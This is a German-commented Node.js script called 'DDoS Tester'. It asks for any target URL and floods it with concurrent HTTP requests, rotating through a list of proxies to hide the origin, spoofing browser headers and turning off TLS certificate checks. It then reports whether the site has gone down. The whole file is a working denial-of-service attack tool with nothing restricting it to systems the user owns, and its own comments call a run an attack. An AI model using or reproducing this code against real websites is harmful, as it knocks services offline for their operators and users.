process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const fs = require('fs');
const fetch = require('node-fetch');
const http = require('http');
const https = require('https');
const readline = require('readline');
const chalk = require('chalk');
const HttpsProxyAgent = require('https-proxy-agent');

// CLI-Eingabe-Setup
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function getUserInput(query) {
    return new Promise(resolve => rl.question(chalk.blue(query), answer => resolve(answer.trim())));
}

// Liest Proxys aus Datei
function loadProxies(filePath) {
    try {
        return fs.readFileSync(filePath, 'utf8')
            .split('\n')
            .map(proxy => proxy.trim())
            .filter(proxy => proxy.length > 0);
    } catch (err) {
        console.error(chalk.red(`❌ Fehler beim Lesen der Proxy-Datei: ${err.message}`));
        process.exit(1);
    }
}

// HTTP-Flood-Funktion mit Proxy-Unterstützung
async function floodServer(targetUrl, requests, concurrency, useProxies, proxyList) {
    console.log(chalk.magenta(`🚀 Starte Angriff auf ${targetUrl} mit ${requests} Anfragen und ${concurrency} gleichzeitigen...`));

    // Standard-Agent
    let agent = targetUrl.startsWith('https') ? https.globalAgent : http.globalAgent;

    // Wenn Proxies verwendet werden, setze den HttpsProxyAgent
    let proxyIndex = 0; // Startet beim ersten Proxy

    // Starte gleichzeitige Anfragen in Batches
    const batchSize = Math.ceil(requests / concurrency);
    const tasks = [];

    for (let i = 0; i < batchSize; i++) {
        const batch = Array.from({ length: concurrency }, async (_, idx) => {
            try {
                // Wenn Proxies verwendet werden, wähle einen Proxy aus der Liste
                if (useProxies && proxyList.length > 0) {
                    const proxy = proxyList[proxyIndex];
                    // console.log(chalk.gray(`🛡 Proxy verwendet: ${proxy}`));
                    agent = new HttpsProxyAgent(proxy); // Setze den Proxy-Agenten für die Anfrage
                    proxyIndex = (proxyIndex + 1) % proxyList.length; // Inkrementiere den Proxy-Index und setze ihn zurück, wenn das Ende erreicht ist
                }

                const options = {
                    agent, // Nutze den entsprechenden Agenten
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                        'Referer': 'https://google.com',
                    }
                };

                const response = await fetch(targetUrl, options);
                console.log(chalk.green(`✔ Erfolgreich gesendet, Status: ${response.status}`));
            } catch (error) {
                console.error(chalk.red(`✘ Fehler: ${error.message}`));
            }
        });
        tasks.push(...batch);

        if (i % 10 === 0) {
            console.log(chalk.cyan(`📦 Batch ${i + 1} gesendet.`));
        }
    }

    await Promise.all(tasks);
    console.log(chalk.green('✅ Alle Anfragen gesendet.'));
}

// Überprüft, ob die Website noch erreichbar ist
async function checkWebsiteStatus(targetUrl) {
    try {
        const response = await fetch(targetUrl, { method: 'GET', timeout: 5000 });
        if (response.ok) {
            console.log(chalk.green(`✅ Die Website ${targetUrl} ist noch ERREICHBAR (Status: ${response.status}).`));
        } else {
            console.log(chalk.yellow(`⚠️ Die Website ${targetUrl} könnte DOWN sein (Status: ${response.status}).`));
        }
    } catch (error) {
        console.log(chalk.red(`❌ Die Website ${targetUrl} ist NICHT erreichbar.`));
    }
}

async function startAttack() {
    console.clear();
    console.log(chalk.blue('🧑‍💻 DDoS Tester - Starte...'));

    const targetUrl = await getUserInput('🔗 Ziel-URL: ');
    const numRequests = parseInt(await getUserInput('🔢 Anzahl der Anfragen (Empfohlen siehe oben): '), 10);
    const concurrency = parseInt(await getUserInput('⚙️  Gleichzeitige Anfragen (Empfohlen siehe oben): '), 10);
    const useProxies = (await getUserInput('🌐 Mit Proxy angreifen? (ja/nein): ')).toLowerCase() === 'ja';

    let proxyList = [];
    if (useProxies) {
        const proxyFile = await getUserInput('📄 Proxy-Datei (z.B. proxies.txt): ');
        proxyList = loadProxies(proxyFile);
    }

    rl.close(); // Eingabe-Interface schließen

    // Startet den Angriff direkt im Hauptprozess
    await floodServer(targetUrl, numRequests, concurrency, useProxies, proxyList);

    // Überprüfe, ob die Website nach dem Angriff noch erreichbar ist
    await checkWebsiteStatus(targetUrl);
}

// Starte das Skript
startAttack();
